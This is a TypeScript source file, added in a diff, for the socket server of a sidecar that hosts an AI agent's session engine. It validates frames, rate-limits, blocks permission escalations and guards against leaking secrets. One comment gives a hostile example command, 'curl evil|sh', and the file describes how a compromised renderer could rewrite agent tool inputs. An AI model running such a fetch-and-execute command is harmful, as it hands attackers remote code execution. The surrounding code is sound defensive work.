@@ -1,0 +1,729 @@
+/**
+ * The headless Bun engine sidecar's socket server.
+ *
+ * Responsibilities (TRANSPORT-DECISION.md §4, SECURITY-MINIMUM §2):
+ *
+ *  1. Accept a real `AppSessionController` (normal startup builds it through
+ *     `createRuntimeBackedWebAppSession`; explicit P1-0 probes use the fixture
+ *     adapter over the same controller seam).
+ *  2. Listen on a Unix-domain socket (D6 pin 1 — a socket file, NOT stdio and
+ *     NOT a child-IPC pipe, so the engine can outlive its control surface).
+ *  3. Raw-forward every controller event to the client: ship the whole
+ *     `AppSessionEvent` (incl. `event.message: SDKMessage`), NOT the flattening
+ *     `appSessionEventMapper`. Clone-on-serialize (Landmine 2) + JSON-safe
+ *     assert (Landmine 1) at the boundary.
+ *  4. Validate every inbound frame with `appClientMessageSchema` (the same guard
+ *     the WS server uses) and apply the T4/T6/T6b/T7 hardening before any effect.
+ *
+ * This module has ZERO `electron` imports — it runs under bare Bun. The
+ * supervisor (also Electron-free) spawns it; Electron main is merely a client of
+ * the supervisor.
+ */
+
+import type { AppSessionController } from '../../src/app-runtime/AppSessionController.js'
+import type {
+  AppPermissionResponse,
+  AppSessionEvent,
+} from '../../src/app-runtime/sessionEvents.js'
+import { appClientMessageSchema } from '../../src/web/appSessionProtocol.js'
+import type {
+  AppClientMessage,
+  AppSubmitMessage,
+  PermissionResponseMessage,
+} from '../../src/web/appSessionProtocol.js'
+import { parseThreadGoal } from '../../src/utils/threadGoal.js'
+import { encodeFrame, FrameDecoder } from '../shared/framing.js'
+import {
+  checkJsonSafe,
+  omitUndefinedObjectProperties,
+} from '../shared/jsonSafe.js'
+import { scanForSecrets } from '../shared/secretGuard.js'
+import {
+  MAX_FRAME_BYTES,
+  MAX_FRAMES_PER_WINDOW,
+  MAX_OUTBOUND_FRAME_BYTES,
+  MAX_PROMPT_BYTES,
+  MAX_TEXT_FIELD_CHARS,
+  RATE_WINDOW_MS,
+} from '../shared/limits.js'
+import {
+  PROTOCOL_VERSION,
+  type ClientFrame,
+  type ServerFrame,
+  type SessionId,
+} from '../shared/protocol.js'
+
+export type SidecarSocketLike = {
+  write(data: Uint8Array): void
+  end(): void
+}
+
+/** A live client connection on the sidecar socket. */
+type Connection = {
+  socket: SidecarSocketLike
+  decoder: FrameDecoder
+  rateWindowStart: number
+  rateCount: number
+}
+
+export type SidecarServerOptions = {
+  sessionId: SessionId
+  controller: AppSessionController
+  /** Structured logger; defaults to stderr. Never logs secrets. */
+  log?: (line: string) => void
+}
+
+/**
+ * Wires a controller to a connection-handling façade. The transport (Bun's
+ * `Bun.listen({ unix })`) is created by the caller and delivers raw byte chunks
+ * to `handleData`; this class owns framing, validation, and forwarding. Keeping
+ * the transport injectable makes the security logic unit-testable without a real
+ * socket.
+ */
+export class SidecarServer {
+  private readonly sessionId: SessionId
+  private readonly controller: AppSessionController
+  private readonly log: (line: string) => void
+  private readonly connections = new Set<Connection>()
+  private unsubscribe: (() => void) | null = null
+  private activeTurn = false
+
+  constructor(options: SidecarServerOptions) {
+    this.sessionId = options.sessionId
+    this.controller = options.controller
+    this.log = options.log ?? (line => process.stderr.write(`${line}\n`))
+
+    // Subscribe once; broadcast every event to all connected clients as a raw
+    // `event` frame. (P1-0 has one client, but the fan-out matches the WS
+    // server's broadcast model.)
+    this.unsubscribe = this.controller.subscribe(event => {
+      this.broadcastEvent(event)
+    })
+  }
+
+  /** Register a new client connection (called by the transport on connect). */
+  addConnection(socket: SidecarSocketLike): Connection {
+    const connection: Connection = {
+      socket,
+      decoder: new FrameDecoder(MAX_FRAME_BYTES),
+      rateWindowStart: Date.now(),
+      rateCount: 0,
+    }
+    this.connections.add(connection)
+    // Re-home the `app.ready` handshake onto IPC (AppSessionWebSocketServer.ts
+    // :79-87 equivalent).
+    this.send(connection, {
+      kind: 'ready',
+      protocolVersion: PROTOCOL_VERSION,
+      sessionId: this.sessionId,
+      payload: {
+        type: 'app.ready',
+        protocolVersion: PROTOCOL_VERSION,
+        inputEnabled: !this.activeTurn,
+        activeTurn: this.activeTurn,
+        abort: this.controller.getAbortState(),
+        goalSnapshot: this.controller.getGoalSnapshot(),
+        pendingPermissionRequests: this.controller.getPendingPermissionRequests(),
+      },
+    })
+    return connection
+  }
+
+  removeConnection(connection: Connection): void {
+    this.connections.delete(connection)
+  }
+
+  /** Feed a raw socket chunk for a given connection. */
+  handleData(connection: Connection, chunk: Buffer): void {
+    const results = connection.decoder.push(chunk)
+    for (const result of results) {
+      if (result.kind === 'error') {
+        this.sendError(connection, undefined, 'bad_request', result.reason, false)
+        // A framing error is unrecoverable; close the connection.
+        connection.socket.end()
+        this.removeConnection(connection)
+        return
+      }
+
+      if (!this.checkRate(connection)) {
+        this.sendError(
+          connection,
+          undefined,
+          'bad_request',
+          'rate limit exceeded',
+          true,
+        )
+        continue
+      }
+
+      this.handleFrame(connection, result.payload)
+    }
+  }
+
+  /** Tear down the controller subscription. */
+  close(): void {
+    this.unsubscribe?.()
+    this.unsubscribe = null
+    for (const connection of this.connections) {
+      connection.socket.end()
+    }
+    this.connections.clear()
+  }
+
+  /* --------------------------------------------------------------------- *
+   * Inbound (client → engine): validate, then apply. Trust boundary here.
+   * --------------------------------------------------------------------- */
+
+  private handleFrame(connection: Connection, payload: unknown): void {
+    // Envelope check: protocol version + session addressing.
+    if (
+      typeof payload !== 'object' ||
+      payload === null ||
+      (payload as ClientFrame).protocolVersion !== PROTOCOL_VERSION
+    ) {
+      this.sendError(
+        connection,
+        undefined,
+        'bad_request',
+        'missing or wrong protocolVersion',
+        false,
+      )
+      return
+    }
+
+    const frame = payload as Partial<ClientFrame>
+    if (frame.sessionId !== this.sessionId) {
+      // In P1-0 there is one sidecar per sessionId; a mismatched address is a
+      // routing bug or a forged frame. Reject rather than act on it.
+      this.sendError(
+        connection,
+        undefined,
+        'bad_request',
+        'sessionId does not address this sidecar',
+        false,
+      )
+      return
+    }
+
+    // F10 — strict allowlist. The reused Zod objects STRIP unknown keys rather
+    // than reject them, so a frame like `{type:"app.ping", nonce, runCommand}`
+    // would silently pass. The contract (SECURITY-MINIMUM §2, ".strict()",
+    // "everything else rejected and logged") requires rejection. Enforce it with
+    // an explicit key allowlist before the schema parse.
+    const strictError = checkStrictKeys(frame.message)
+    if (strictError) {
+      this.log(`[sidecar] rejected frame with unexpected keys: ${strictError}`)
+      this.sendError(connection, undefined, 'bad_request', strictError, false)
+      return
+    }
+
+    // The message payload MUST pass the existing allowlist schema. Anything
+    // else is dropped at the boundary (SECURITY-MINIMUM §2, R2 — validate at
+    // the trust boundary, never trust the preload).
+    const parsed = appClientMessageSchema.safeParse(frame.message)
+    if (!parsed.success) {
+      this.sendError(
+        connection,
+        undefined,
+        'bad_request',
+        parsed.error.issues[0]?.message ?? 'invalid message',
+        false,
+      )
+      return
+    }
+
+    this.dispatch(connection, parsed.data)
+  }
+
+  private dispatch(connection: Connection, message: AppClientMessage): void {
+    switch (message.type) {
+      case 'app.ping':
+        if (message.nonce.length > MAX_TEXT_FIELD_CHARS) {
+          this.sendError(connection, undefined, 'bad_request', 'nonce too long', false)
+          return
+        }
+        this.send(connection, {
+          kind: 'pong',
+          protocolVersion: PROTOCOL_VERSION,
+          sessionId: this.sessionId,
+          nonce: message.nonce,
+        })
+        return
+
+      case 'app.abort':
+        if ((message.reason?.length ?? 0) > MAX_TEXT_FIELD_CHARS) {
+          this.sendError(
+            connection,
+            message.requestId,
+            'bad_request',
+            'abort reason too long',
+            false,
+          )
+          return
+        }
+        this.controller.abort(message.reason)
+        return
+
+      case 'permission.response':
+        this.handlePermissionResponse(connection, message)
+        return
+
+      case 'app.submit':
+        this.handleSubmit(connection, message)
+        return
+    }
+  }
+
+  private handleSubmit(connection: Connection, message: AppSubmitMessage): void {
+    // T7 (F4) — prompt cap in UTF-8 BYTES (not JS chars), consistent with the
+    // frame byte cap so a multibyte prompt cannot advertise a size the frame
+    // cannot carry.
+    const promptBytes = Buffer.byteLength(message.prompt, 'utf8')
+    if (promptBytes > MAX_PROMPT_BYTES) {
+      this.sendError(
+        connection,
+        message.requestId,
+        'bad_request',
+        `prompt exceeds ${MAX_PROMPT_BYTES} bytes`,
+        false,
+      )
+      return
+    }
+
+    // T4 — `goalSnapshot` arrives as `z.unknown()`. It becomes the diagnostic
+    // session identity (AppSessionController.ts:189), so it must be validated to
+    // the real `ThreadGoal` shape before it touches session state. Reuse the
+    // engine's own `parseThreadGoal` (returns null on any bad shape) as the
+    // safeParse. A present-but-invalid snapshot is rejected; absent is fine.
+    let goalSnapshot: ReturnType<typeof parseThreadGoal> | undefined
+    if (message.options && 'goalSnapshot' in message.options) {
+      const raw = message.options.goalSnapshot
+      if (raw !== undefined) {
+        const validated = parseThreadGoal(raw)
+        if (!validated) {
+          this.sendError(
+            connection,
+            message.requestId,
+            'bad_request',
+            'goalSnapshot is not a valid ThreadGoal',
+            false,
+          )
+          return
+        }
+        goalSnapshot = validated
+      } else {
+        goalSnapshot = null
+      }
+    }
+
+    if (this.activeTurn) {
+      this.sendError(
+        connection,
+        message.requestId,
+        'turn_already_running',
+        'Session turn already running',
+        true,
+      )
+      return
+    }
+
+    this.activeTurn = true
+    void this.controller
+      .submit(message.prompt, {
+        uuid: message.options?.uuid,
+        isMeta: message.options?.isMeta,
+        // Only pass goalSnapshot through if the client supplied the key, so the
+        // controller's `'goalSnapshot' in options` check keeps its meaning.
+        ...(goalSnapshot !== undefined ? { goalSnapshot } : {}),
+      })
+      .catch(error => {
+        const errorMessage = error instanceof Error ? error.message : String(error)
+        this.sendError(
+          connection,
+          message.requestId,
+          errorMessage === 'Session turn already running'
+            ? 'turn_already_running'
+            : 'internal_error',
+          errorMessage,
+          errorMessage === 'Session turn already running',
+        )
+      })
+      .finally(() => {
+        this.activeTurn = false
+      })
+  }
+
+  private handlePermissionResponse(
+    connection: Connection,
+    message: PermissionResponseMessage,
+  ): void {
+    // T5a (structural) — the requestId MUST match a currently-pending
+    // engine-minted request. `respondToPermissionRequest` no-ops on a miss
+    // (AppSessionController.ts:91-96); we check first to answer with a precise
+    // error instead of a silent drop. There is no path that lets the renderer
+    // register a pending request.
+    const pending = this.controller
+      .getPendingPermissionRequests()
+      .find(request => request.requestId === message.requestId)
+    if (!pending) {
+      this.sendError(
+        connection,
+        message.requestId,
+        'permission_not_found',
+        'Permission request is no longer pending',
+        false,
+      )
+      return
+    }
+
+    const response = this.sanitizePermissionResponse(
+      connection,
+      message.requestId,
+      pending.request,
+      message.response,
+    )
+    if (!response) {
+      return // an error was already sent
+    }
+
+    this.controller.respondToPermissionRequest(message.requestId, response)
+  }
+
+  /**
+   * T6 + T6b hardening on an allow. The permission-response schema
+   * (PermissionPromptToolResultSchema) permits two escalations the renderer must
+   * NOT be able to perform:
+   *
+   *   T6  — `updatedInput` command-rewrite: the engine runs the tool with
+   *         `updatedInput` when non-empty, and treats an EMPTY object as "use the
+   *         original tool input" (PermissionPromptToolResultSchema.ts:110-111).
+   *         Both are escalation surfaces from a compromised renderer:
+   *           - a non-empty rewrite swaps the command ("ls" → "curl evil|sh");
+   *           - an empty `{}` reverses an engine-side gate rewrite (if the engine
+   *             gated `curl http→https`, "use original" restores the unsafe http).
+   *         Fix (F1): the sidecar is ECHO-ONLY in the strong sense — it forwards
+   *         exactly the GATED input the engine already vetted, never renderer
+   *         bytes. A renderer-supplied `updatedInput` is accepted only if it is
+   *         empty (a plain confirm) or deep-equals the gated input; anything else
+   *         is rejected. What we hand the engine is always the gated input, so an
+   *         empty `{}` can no longer mean "use original".
+   *
+   *   T6b — `updatedPermissions`: on an allow these are persisted via
+   *         `persistPermissionUpdates` (PermissionPromptToolResultSchema.ts:96
+   *         -105), installing durable always-allow rules. A forged allow must
+   *         not be able to write policy. Strip the field before it reaches the
+   *         engine.
+   *
+   * Returns the sanitized response, or null if it was rejected (error sent).
+   */
+  private sanitizePermissionResponse(
+    connection: Connection,
+    requestId: string,
+    request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
+    response: AppPermissionResponse,
+  ): AppPermissionResponse | null {
+    if (response.behavior === 'deny') {
+      // Deny carries only a message; nothing to escalate.
+      return response
+    }
+
+    // T6b — never let a renderer install durable permission rules on an allow.
+    if (response.updatedPermissions !== undefined) {
+      this.log(
+        `[sidecar] stripped updatedPermissions on allow requestId=${requestId} (T6b)`,
+      )
+    }
+
+    // T6 (F1) — the renderer's `updatedInput` may only CONFIRM the gated input.
+    // Accept it iff it is empty (a plain confirm) or exactly equals the gated
+    // input; reject any other value. Then forward the GATED input itself — never
+    // the renderer's bytes — so an empty `{}` cannot mean "use original" and a
+    // rewrite cannot slip through.
+    const gatedInput = extractGatedToolInput(request)
+    const echoed = response.updatedInput
+    const isConfirm =
+      Object.keys(echoed).length === 0 ||
+      (gatedInput !== undefined && deepEqual(echoed, gatedInput))
+    if (!isConfirm) {
+      this.sendError(
+        connection,
+        requestId,
+        'bad_request',
+        'updatedInput may not rewrite the gated tool input',
+        false,
+      )
+      return null
+    }
+
+    return {
+      behavior: 'allow',
+      // Forward the gated input the engine already vetted. If we could not read
+      // it from the request (unexpected shape), fall back to an empty object,
+      // which the engine reads as "use original" — the same input the engine
+      // itself gated, since no renderer rewrite reached it.
+      updatedInput: gatedInput ?? {},
+      // updatedPermissions intentionally dropped (T6b).
+      ...(response.toolUseID !== undefined ? { toolUseID: response.toolUseID } : {}),
+    }
+  }
+
+  /* --------------------------------------------------------------------- *
+   * Outbound (engine → client): raw-forward, JSON-safe, clone-on-serialize.
+   * --------------------------------------------------------------------- */
+
+  private broadcastEvent(event: AppSessionEvent): void {
+    if (this.connections.size === 0) {
+      return
+    }
+
+    // Landmine 2 (immutability): `AppSessionController.emit()` hands the SAME
+    // mutable event reference to every listener. We must never mutate it and
+    // must serialize from a clone so a future second subscriber can't observe a
+    // half-mutated object. `structuredClone` also surfaces a non-cloneable value
+    // early (belt to the JSON-safe braces below).
+    let cloned: AppSessionEvent
+    try {
+      cloned = structuredClone(event)
+    } catch (error) {
+      this.log(
+        `[sidecar] dropped un-cloneable event type=${event.type}: ${
+          error instanceof Error ? error.message : String(error)
+        }`,
+      )
+      return
+    }
+
+    // Real SDK messages materialize optional fields as `key: undefined`.
+    // Canonical JSON represents those as absent properties. Normalize only the
+    // private clone; array entries and every exotic value remain fail-closed.
+    omitUndefinedObjectProperties(cloned)
+
+    // Landmine 1 (JSON-safe): assert the payload round-trips through JSON
+    // losslessly BEFORE it hits the wire. A Buffer/Date/Map/bigint/cyclic value
+    // is rejected+logged, never silently corrupted. No current producer emits
+    // one; this is the boundary contract, not dead weight.
+    const safety = checkJsonSafe(cloned)
+    if (!safety.ok) {
+      this.log(
+        `[sidecar] dropped non-JSON-safe event type=${event.type} at ${safety.path}: ${safety.reason}`,
+      )
+      return
+    }
+
+    const frame: ServerFrame = {
+      kind: 'event',
+      protocolVersion: PROTOCOL_VERSION,
+      sessionId: this.sessionId,
+      event: cloned,
+    }
+    for (const connection of this.connections) {
+      this.send(connection, frame)
+    }
+  }
+
+  private send(connection: Connection, frame: ServerFrame): void {
+    // F6 — outbound secret-key assertion on EVERY frame (events AND ready). The
+    // engine is the sole secret owner; a token key must never cross IPC. This is
+    // separate from JSON-safety (a token object is valid JSON). An error frame
+    // is exempt (it is sidecar-authored and carries no session payload) to avoid
+    // an infinite loop if the guard itself needs to report.
+    if (frame.kind !== 'error') {
+      const secret = scanForSecrets(frame)
+      if (!secret.ok) {
+        this.log(
+          `[sidecar] BLOCKED outbound frame carrying secret key "${secret.key}" at ${secret.path} (F6)`,
+        )
+        this.sendError(
+          connection,
+          undefined,
+          'internal_error',
+          'outbound frame blocked: contained a credential field',
+          false,
+        )
+        return
+      }
+    }
+
+    let encoded: Buffer
+    try {
+      encoded = encodeFrame(frame)
+    } catch (error) {
+      this.log(
+        `[sidecar] failed to encode frame kind=${frame.kind}: ${
+          error instanceof Error ? error.message : String(error)
+        }`,
+      )
+      return
+    }
+
+    // Sanity bound on outbound size (F3): trusted engine output may be large,
+    // but a runaway is dropped rather than allowed to grow unbounded.
+    if (encoded.byteLength > MAX_OUTBOUND_FRAME_BYTES) {
+      this.log(
+        `[sidecar] dropped oversized outbound frame kind=${frame.kind} (${encoded.byteLength} > ${MAX_OUTBOUND_FRAME_BYTES})`,
+      )
+      return
+    }
+
+    try {
+      connection.socket.write(encoded)
+    } catch (error) {
+      this.log(
+        `[sidecar] write failed, dropping connection: ${
+          error instanceof Error ? error.message : String(error)
+        }`,
+      )
+      this.removeConnection(connection)
+    }
+  }
+
+  private sendError(
+    connection: Connection,
+    requestId: string | undefined,
+    code: Extract<ServerFrame, { kind: 'error' }>['code'],
+    message: string,
+    retryable: boolean,
+  ): void {
+    this.send(connection, {
+      kind: 'error',
+      protocolVersion: PROTOCOL_VERSION,
+      sessionId: this.sessionId,
+      requestId,
+      code,
+      message,
+      retryable,
+    })
+  }
+
+  private checkRate(connection: Connection): boolean {
+    const now = Date.now()
+    if (now - connection.rateWindowStart >= RATE_WINDOW_MS) {
+      connection.rateWindowStart = now
+      connection.rateCount = 0
+    }
+    connection.rateCount += 1
+    return connection.rateCount <= MAX_FRAMES_PER_WINDOW
+  }
+}
+
+/**
+ * F10 — strict per-type key allowlist. The reused Zod schemas strip unknown
+ * keys; this rejects a frame that carries any key not in the renderer-facing
+ * contract, at every renderer-controlled level: the message itself,
+ * `app.submit.options` (rejecting `options.uuid`, which is engine-identity), and
+ * `permission.response.response` (rejecting host-only escalations the Zod schema
+ * still accepts — `deny.interrupt`, `allow.updatedPermissions`). Returns an error
+ * string, or null if the shape is clean. Type/field VALUES are still validated by
+ * the Zod parse afterward; this only enforces "no extra keys".
+ */
+function checkStrictKeys(message: unknown): string | null {
+  if (typeof message !== 'object' || message === null || Array.isArray(message)) {
+    return 'message must be an object'
+  }
+  const obj = message as Record<string, unknown>
+  const type = obj.type
+
+  const allowedByType = new Map<string, Set<string>>([
+    ['app.submit', new Set(['type', 'requestId', 'prompt', 'options'])],
+    ['app.abort', new Set(['type', 'requestId', 'reason'])],
+    ['permission.response', new Set(['type', 'requestId', 'response'])],
+    ['app.ping', new Set(['type', 'nonce'])],
+  ])
+  const allowedOptionKeys = new Set(['isMeta', 'goalSnapshot'])
+  // The renderer-facing permission contract (protocol.ts PermissionResponseInput)
+  // exposes ONLY these keys. The reused Zod schema additionally accepts host-only
+  // escalations (allow.updatedPermissions, deny.interrupt) that the renderer must
+  // not be able to set; reject any key outside this allowlist rather than let the
+  // Zod parse silently strip it or forward `interrupt` to the engine.
+  const allowedResponseKeys = new Set(['behavior', 'updatedInput', 'message'])
+
+  // `Map.get`, not `key in obj` — an inherited key like "constructor" or
+  // "toString" must NOT be treated as a known message type (it would also crash
+  // a plain-object lookup by resolving to a prototype function).
+  if (typeof type !== 'string') {
+    return `unknown message type: ${String(type)}`
+  }
+  const allowed = allowedByType.get(type)
+  if (!allowed) {
+    return `unknown message type: ${type}`
+  }
+  for (const key of Object.keys(obj)) {
+    if (!allowed.has(key)) {
+      return `unexpected key "${key}" on ${type}`
+    }
+  }
+
+  if (type === 'app.submit' && obj.options !== undefined) {
+    if (typeof obj.options !== 'object' || obj.options === null || Array.isArray(obj.options)) {
+      return 'options must be an object'
+    }
+    for (const key of Object.keys(obj.options)) {
+      if (!allowedOptionKeys.has(key)) {
+        return `unexpected key "${key}" on app.submit.options`
+      }
+    }
+  }
+
+  if (type === 'permission.response' && obj.response !== undefined) {
+    if (
+      typeof obj.response !== 'object' ||
+      obj.response === null ||
+      Array.isArray(obj.response)
+    ) {
+      return 'response must be an object'
+    }
+    for (const key of Object.keys(obj.response)) {
+      if (!allowedResponseKeys.has(key)) {
+        return `unexpected key "${key}" on permission.response.response`
+      }
+    }
+  }
+
+  return null
+}
+
+/**
+ * Pull the tool input the engine actually gated out of the raw permission
+ * request, so T6 can compare it against the renderer's `updatedInput`. The
+ * request is an `SDKControlPermissionRequest`; the gated tool input lives at
+ * `request.input` (mirrors `PermissionPromptTool.inputSchema` — `{ tool_name,
+ * input, tool_use_id }`). Returns undefined if the shape is unexpected, in which
+ * case T6 falls back to allowing an empty `updatedInput` only.
+ */
+function extractGatedToolInput(
+  request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
+): Record<string, unknown> | undefined {
+  const candidate = request as { input?: unknown }
+  if (
+    candidate.input !== null &&
+    typeof candidate.input === 'object' &&
+    !Array.isArray(candidate.input)
+  ) {
+    return candidate.input as Record<string, unknown>
+  }
+  return undefined
+}
+
+/** Structural deep equality for JSON-shaped values (T6 echo check). */
+function deepEqual(a: unknown, b: unknown): boolean {
+  if (a === b) return true
+  if (typeof a !== typeof b) return false
+  if (a === null || b === null) return a === b
+  if (typeof a !== 'object') return false
+
+  const aArr = Array.isArray(a)
+  const bArr = Array.isArray(b)
+  if (aArr !== bArr) return false
+
+  if (aArr && bArr) {
+    if (a.length !== b.length) return false
+    return a.every((item, i) => deepEqual(item, b[i]))
+  }
+
+  const aObj = a as Record<string, unknown>
+  const bObj = b as Record<string, unknown>
+  const aKeys = Object.keys(aObj)
+  const bKeys = Object.keys(bObj)
+  if (aKeys.length !== bKeys.length) return false
+  return aKeys.every(key => key in bObj && deepEqual(aObj[key], bObj[key]))
+}
